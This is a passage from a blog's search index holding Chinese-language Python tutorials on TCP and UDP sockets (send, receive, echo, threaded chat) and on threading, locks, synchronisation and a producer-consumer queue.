class="line">            break</span><br><span class="line"></span><br><span class="line">        #发送一些数据到客户端</span><br><span class="line">        sendData = input(&quot;请输入信息：&quot;)</span><br><span class="line">        clientSocket.send(sendData.encode())</span><br><span class="line">    #当客户端失去连接后跳出循环，执行关闭套接字</span><br><span class="line">    clientSocket.close()</span><br><span class="line">#关闭监听套接字，只要这个套接字关闭了，就意味着整个程序不能再接收任何新的客户端的连接</span><br><span class="line">serversocket.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python Socket套接字-UDP</title>
      <link href="/article/python-socket-udp.html"/>
      <url>/article/python-socket-udp.html</url>
      
        <content type="html"><![CDATA[<p>Python网络编程相关主要模块主要支持两种协议：TCP及UDP协议。<br>与Internet进行通信，程序必须使用套接字Socket的对象。<br>Python里边可以使用Socket模块来支持套接字。</p><h3 id="Socket-套接字："><a href="#Socket-套接字：" class="headerlink" title="Socket 套接字："></a>Socket 套接字：</h3><p>socket(方式，协议)</p><h4 id="AF-INET"><a href="#AF-INET" class="headerlink" title="AF_INET"></a>AF_INET</h4><p>对于TCP/IP协议的TCP和UDP通信。</p><p>TCP 采用：SOCK_STREAM UDP采用：SOCK_DGRAM</p><h4 id="AF-UNIX"><a href="#AF-UNIX" class="headerlink" title="AF_UNIX"></a>AF_UNIX</h4><p>用于同一台机器上的进程间通信。</p><h3 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h3><p><img src="../do/images/socket-send.png" alt></p><h3 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">#创建套接字，采用UDP协议</span><br><span class="line">udpSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">#客户机绑定一个IP，一般来说是不用绑定的，这个操作由服务端来绑定</span><br><span class="line">udpSocket.bind((&quot;&quot;, 1024))</span><br><span class="line">udpSocket.sendto(b&apos;使用UDP发送的数据，每一次都需要写上接收方的IP和端口&apos;, (&apos;192.168.123.100&apos;, 6000))</span><br></pre></td></tr></table></figure><h3 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">#创建套接字，采用UDP协议</span><br><span class="line">udpSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">#绑定的目的：为了让接收方有一个明确的地址</span><br><span class="line">udpSocket.bind((&quot;&quot;, 60000))</span><br><span class="line">#等待接收对方发送的数据,1024表示本次接收的最大字节数</span><br><span class="line">recvData = udpSocket.recvfrom(1024)</span><br><span class="line">#打印接收到的数据</span><br><span class="line">print(recvData)</span><br><span class="line">#关闭套接字</span><br><span class="line">udpSocket.close()</span><br></pre></td></tr></table></figure><h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><h6 id="发送数据-1"><a href="#发送数据-1" class="headerlink" title="发送数据"></a>发送数据</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">udpSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">destIp = input(&quot;请输入目的ip:&quot;)</span><br><span class="line">destPort = int(input(&quot;请输入目的port:&quot;))</span><br><span class="line">sendData = input(&quot;请输入要发送的数据:&quot;)</span><br><span class="line"></span><br><span class="line">udpSocket.sendto(sendData.encode(&quot;gb2312&quot;), (destIp, destPort))</span><br></pre></td></tr></table></figure><h6 id="接收数据-1"><a href="#接收数据-1" class="headerlink" title="接收数据"></a>接收数据</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">#创建套接字，采用UDP协议</span><br><span class="line">udpSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">#绑定的目的：为了让接收方有一个明确的地址</span><br><span class="line">udpSocket.bind((&quot;&quot;, 60000))</span><br><span class="line">#等待接收对方发送的数据,1024表示本次接收的最大字节数</span><br><span class="line">recvData = udpSocket.recvfrom(1024)</span><br><span class="line"></span><br><span class="line">#接收的数据包为元祖，含接收方的IP地址、数据,数据在前，IP信息在后</span><br><span class="line">content, destInfo = recvData</span><br><span class="line"></span><br><span class="line">print(&quot;接收的内容为： %s&quot; % content.decode(&quot;gb18030&quot;))</span><br><span class="line">print(&quot;对方的IP地址信息：%s:%s&quot; % (destInfo[0],destInfo[1]))</span><br><span class="line">print(&quot;对方的IP地址信息：%s，接收的内容为： %s&quot; % (str(recvData[1]),recvData[0].decode(&quot;gb18030&quot;)))</span><br><span class="line"></span><br><span class="line">#关闭套接字</span><br><span class="line">udpSocket.close()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    #创建套接字，采用UDP协议</span><br><span class="line">    udpSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">    #绑定的目的：为了让接收方有一个明确的地址</span><br><span class="line">    udpSocket.bind((&quot;&quot;, 60000))</span><br><span class="line">    while True:</span><br><span class="line">        #等待接收对方发送的数据,1024表示本次接收的最大字节数</span><br><span class="line">        recvData = udpSocket.recvfrom(1024)</span><br><span class="line">        #接收的数据包为元祖，含接收方的IP地址、数据,数据在前，IP信息在后</span><br><span class="line">        print(&quot;对方的IP地址信息：%s，接收的内容为： %s&quot; % (str(recvData[1]),recvData[0].decode(&quot;gb18030&quot;)))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br><span class="line">    #关闭套接字</span><br><span class="line">    udpSocket.close()</span><br></pre></td></tr></table></figure><h3 id="接收数据并发回"><a href="#接收数据并发回" class="headerlink" title="接收数据并发回"></a>接收数据并发回</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    #创建套接字，采用UDP协议</span><br><span class="line">    udpSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">    #绑定的目的：为了让接收方有一个明确的地址</span><br><span class="line">    udpSocket.bind((&quot;&quot;, 60000))</span><br><span class="line">    while True:</span><br><span class="line">        #等待接收对方发送的数据,1024表示本次接收的最大字节数</span><br><span class="line">        recvData = udpSocket.recvfrom(1024)</span><br><span class="line">        #接收的数据包为元祖，含接收方的IP地址、数据,数据在前，IP信息在后</span><br><span class="line">        udpSocket.sendto(recvData[0],recvData[1])</span><br><span class="line">        print(&quot;对方的IP地址信息：%s，接收的内容为： %s&quot; % (str(recvData[1]),recvData[0].decode(&quot;gb18030&quot;)))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br><span class="line">    #关闭套接字</span><br><span class="line">    udpSocket.close()</span><br></pre></td></tr></table></figure><h3 id="同时接收数据"><a href="#同时接收数据" class="headerlink" title="同时接收数据"></a>同时接收数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">#接收数据</span><br><span class="line">def recvData():</span><br><span class="line">    while True:</span><br><span class="line">        recvInfo = udpSocket.recvfrom(1024)</span><br><span class="line">        print(&quot;\n&gt;&gt;%s:%s&quot;%(str(recvInfo[1]), recvInfo[0]))</span><br><span class="line"></span><br><span class="line">#发送数据</span><br><span class="line">def sendData():</span><br><span class="line">    while True:</span><br><span class="line">        sendInfo = input(&quot;&lt;&lt;&quot;)</span><br><span class="line">        udpSocket.sendto(sendInfo.encode(&quot;gb2312&quot;), (destIp, destPort))</span><br><span class="line"></span><br><span class="line">udpSocket = None</span><br><span class="line">destIp = &quot;&quot;</span><br><span class="line">destPort = 0</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    global udpSocket</span><br><span class="line">    global destIp</span><br><span class="line">    global destPort </span><br><span class="line"></span><br><span class="line">    destIp = &apos;192.168.123.100&apos;</span><br><span class="line">    destPort = 6000</span><br><span class="line"></span><br><span class="line">    udpSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">    udpSocket.bind((&quot;&quot;, 1024))</span><br><span class="line"></span><br><span class="line">    recv_Data = Thread(target=recvData)</span><br><span class="line">    send_Data = Thread(target=sendData)</span><br><span class="line"></span><br><span class="line">    recv_Data.start()</span><br><span class="line">    send_Data.start()</span><br><span class="line"></span><br><span class="line">    recv_Data.join()</span><br><span class="line">    send_Data.join()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 多线程</title>
      <link href="/article/python-threading.html"/>
      <url>/article/python-threading.html</url>
      
        <content type="html"><![CDATA[<h3 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h3><h4 id="查看一些进程函数："><a href="#查看一些进程函数：" class="headerlink" title="查看一些进程函数："></a>查看一些进程函数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&apos;当前激活的线程个数为：%s&apos;%threading.active_count())</span><br><span class="line">    print(&apos;当前运行的线程名：%s&apos;%threading.enumerate())</span><br><span class="line">    print(&apos;当前程序运行的线程(主线程)名：%s&apos;%threading.current_thread())</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="启动一个线程"><a href="#启动一个线程" class="headerlink" title="启动一个线程"></a>启动一个线程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    print(&quot;如果多个线程执行的都是同一个函数的话，各自之间不会有影响。&quot;)</span><br><span class="line">    time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(5):</span><br><span class="line">    thread = Thread(target=test)</span><br><span class="line">    thread.start()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def thread():</span><br><span class="line">    print(&apos;线程\n&apos;)</span><br><span class="line">    for x in range(10):</span><br><span class="line">        time.sleep(0.2)</span><br><span class="line">    print(&apos;结束线程\n&apos;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    #创建一个线程，目标是thread,自定义线程名test</span><br><span class="line">    add_thread = threading.Thread(target=thread,name=&apos;test&apos;)</span><br><span class="line">    #启动线程</span><br><span class="line">    add_thread.start()</span><br><span class="line">    #等待上边的add_thread线程结束后再运行下边的代码</span><br><span class="line">    add_thread.join()</span><br><span class="line">    print(&apos;全部结束&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def thread():</span><br><span class="line">    print(&apos;这是线程&apos;)</span><br><span class="line">    time.sleep(10)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for x in range(5):</span><br><span class="line">        #创建一个线程，目标是thread,自定义线程名test</span><br><span class="line">        add_thread = threading.Thread(target=thread,name=&apos;test&apos;)</span><br><span class="line">        #启动线程</span><br><span class="line">        add_thread.start()</span><br></pre></td></tr></table></figure><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>类继承，一定要重写run方法、面对对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">class Thread(threading.Thread):</span><br><span class="line"></span><br><span class="line">        def run(self):</span><br><span class="line">            for x in range(5):</span><br><span class="line">                #输出线程名</span><br><span class="line">                print(&apos;self.name属性保存当前的线程名，当前线程名：&apos;+self.name + str(x))</span><br><span class="line">                </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    thread = Thread()</span><br><span class="line">    thread.start()</span><br></pre></td></tr></table></figure><h3 id="多线程使用全局变量"><a href="#多线程使用全局变量" class="headerlink" title="多线程使用全局变量"></a>多线程使用全局变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#线程之间共享全局变量</span><br><span class="line">num = 100</span><br><span class="line"></span><br><span class="line">def threadone():</span><br><span class="line">    global num</span><br><span class="line">    for i in range(3):</span><br><span class="line">        num += 1</span><br><span class="line"></span><br><span class="line">    print(&quot;这是线程threadone，当前num值为：%d&quot;%num)</span><br><span class="line"></span><br><span class="line">def threadtwo():</span><br><span class="line">    global num</span><br><span class="line">    print(&quot;这是线程threadtwo，当前num值为：%d&quot;%num)</span><br><span class="line"></span><br><span class="line">print(&quot;线程还没创建之前，num的值为：%d&quot;%num)</span><br><span class="line"></span><br><span class="line">threadone = Thread(target=threadone)</span><br><span class="line">threadone.start()</span><br><span class="line"></span><br><span class="line">time.sleep(1)</span><br><span class="line">print(&apos;这里延时一秒，保证threadone线程中的事情做完，如果没有延迟，数值越大，那么数据就会出错。&apos;)</span><br><span class="line"></span><br><span class="line">threadtwo = Thread(target=threadtwo)</span><br><span class="line">threadtwo.start()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">num = 0</span><br><span class="line">flag = 1</span><br><span class="line"></span><br><span class="line">def threadone():</span><br><span class="line">    global num</span><br><span class="line">    global flag</span><br><span class="line">    if flag == 1:</span><br><span class="line">        for i in range(1000000):</span><br><span class="line">            num += 1</span><br><span class="line"></span><br><span class="line">        flag = 0</span><br><span class="line"></span><br><span class="line">    print(&quot;这是线程threadone当前num的值为：%d&quot;%num)</span><br><span class="line"></span><br><span class="line">def threadtwo():</span><br><span class="line">    global num</span><br><span class="line">    </span><br><span class="line">    while True:</span><br><span class="line">        if flag != 1:</span><br><span class="line">            for i in range(1000000):</span><br><span class="line">                num += 1</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    print(&quot;这是线程threadtwo当前num的值为：%d&quot;%num)</span><br><span class="line">    print(&apos;threadtwo这个函数会一直循环检测，耗费大量资源，直到检测flag不等于1的时候开始执行，但flag的值默认为1，只有等待threadone线程结束后，flag才会赋值0，该条件才会成立。&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threadone = Thread(target=threadone)</span><br><span class="line">threadone.start()</span><br><span class="line"></span><br><span class="line">threadtwo = Thread(target=threadtwo)</span><br><span class="line">threadtwo.start()</span><br><span class="line"></span><br><span class="line">print(&quot;当前num的值为：%d&quot;%num)</span><br></pre></td></tr></table></figure><h3 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h3><p>只有全局变量在多个线程中共享，为了保证正确运行才会需要上锁。</p><p>非全局变量在每个线程中，每个线程各有一份，不会共享，不需要加锁。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread, Lock</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">num = 0</span><br><span class="line"></span><br><span class="line">def threadone():</span><br><span class="line">    global num</span><br><span class="line">    #这个线程和threadtwo线程都在抢着进行上锁，如果有１方成功的上锁，那么导致另外一方会堵塞（一直等待）到这个锁被解开为止.</span><br><span class="line">    mutex.acquire()</span><br><span class="line">    for i in range(1000000):</span><br><span class="line">        num += 1</span><br><span class="line">    #进行解锁，剩下还没上锁而堵塞的线程就会进行抢着上锁。</span><br><span class="line">    mutex.release()</span><br><span class="line"></span><br><span class="line">    print(&quot;这是线程threadone当前num的值为：%d&quot;%num)</span><br><span class="line"></span><br><span class="line">def threadtwo():</span><br><span class="line">    global num</span><br><span class="line">    mutex.acquire()</span><br><span class="line">    for i in range(1000000):</span><br><span class="line">        num += 1</span><br><span class="line">    mutex.release()</span><br><span class="line"></span><br><span class="line">    print(&quot;这是线程threadtwo当前num的值为：%d&quot;%num)</span><br><span class="line"></span><br><span class="line">#创建一把互斥锁，这个锁默认是没有上锁的</span><br><span class="line">mutex = Lock()</span><br><span class="line"></span><br><span class="line">threadone = Thread(target=threadone)</span><br><span class="line">threadone.start()</span><br><span class="line"></span><br><span class="line">threadtwo = Thread(target=threadtwo)</span><br><span class="line">threadtwo.start()</span><br><span class="line"></span><br><span class="line">print(&quot;当前num的值为：%d&quot;%num)</span><br></pre></td></tr></table></figure><h3 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread,Lock</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">class Task1(Thread):</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if lock1.acquire():</span><br><span class="line">                print(&quot;这是第一个线程，默认没有锁上，待执行完毕，就会把第二个函数的锁进行解锁。&quot;)</span><br><span class="line">                sleep(1)</span><br><span class="line">                lock2.release()</span><br><span class="line"></span><br><span class="line">class Task2(Thread):</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if lock2.acquire():</span><br><span class="line">                print(&quot;这是第二个线程，默认锁上，待第一个线程执行完毕后解锁，执行完毕后就会把第三个函数的锁进行解锁。&quot;)</span><br><span class="line">                sleep(1)</span><br><span class="line">                lock3.release()</span><br><span class="line"></span><br><span class="line">class Task3(Thread):</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if lock3.acquire():</span><br><span class="line">                print(&quot;这是第三个线程，默认锁上，待第二个线程执行完毕后解锁，执行完毕后就会把第一个函数的锁进行解锁。&quot;)</span><br><span class="line">                sleep(1)</span><br><span class="line">                lock1.release()</span><br><span class="line"></span><br><span class="line">lock1 = Lock()</span><br><span class="line"></span><br><span class="line">lock2 = Lock()</span><br><span class="line">lock2.acquire()</span><br><span class="line"></span><br><span class="line">lock3 = Lock()</span><br><span class="line">lock3.acquire()</span><br><span class="line"></span><br><span class="line">threadone = Task1()</span><br><span class="line">threadonetwo = Task2()</span><br><span class="line">threadthree = Task3()</span><br><span class="line"></span><br><span class="line">print(&apos;这样上锁的目的是为了让三个线程同步执行。&apos;)</span><br><span class="line">sleep(3)</span><br><span class="line"></span><br><span class="line">threadone.start()</span><br><span class="line">threadonetwo.start()</span><br><span class="line">threadthree.start()</span><br></pre></td></tr></table></figure><h3 id="生产者与消费者"><a href="#生产者与消费者" class="headerlink" title="生产者与消费者"></a>生产者与消费者</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">class Producer(threading.Thread):</span><br><span class="line">    def run(self):</span><br><span class="line">        global queue</span><br><span class="line">        count = 0</span><br><span class="line">        while True:</span><br><span class="line">            if queue.qsize() &lt; 1000:</span><br><span class="line">                for i in range(100):</span><br><span class="line">                    count = count +1</span><br><span class="line">                    msg = &apos;生成产品&apos;+str(count)</span><br><span class="line">                    queue.put(msg)</span><br><span class="line">                    print(msg)</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line"></span><br><span class="line">class Consumer(threading.Thread):</span><br><span class="line">    def run(self):</span><br><span class="line">        global queue</span><br><span class="line">        while True:</span><br><span class="line">            if queue.qsize() &gt; 100:</span><br><span class="line">                for i in range(3):</span><br><span class="line">                    msg = self.name + &apos;消费了 &apos;+queue.get()</span><br><span class="line">                    print(msg)</span><br><span class="line">            time.sleep(1)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    queue = queue.Queue()</span><br><span class="line"></span><br><span class="line">    for i in range(500):</span><br><span class="line">        queue.put(&apos;初始的产品：&apos; + str(i))</span><br><span class="line"></span><br><span class="line">    for i in range(2):</span><br><span class="line">        producer = Producer()</span><br><span class="line">        producer.start()</span><br><span class="line"></span><br><span class="line">    for i in range(5):</span><br><span class="line">        consumer = Consumer()</span><br><span class="line">        consumer.start()</span><br></pre></td></tr></table></figure><h3 id="threadlocal"><a href="#threadlocal" class="headerlink" title="threadlocal"></a>threadlocal</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line"># 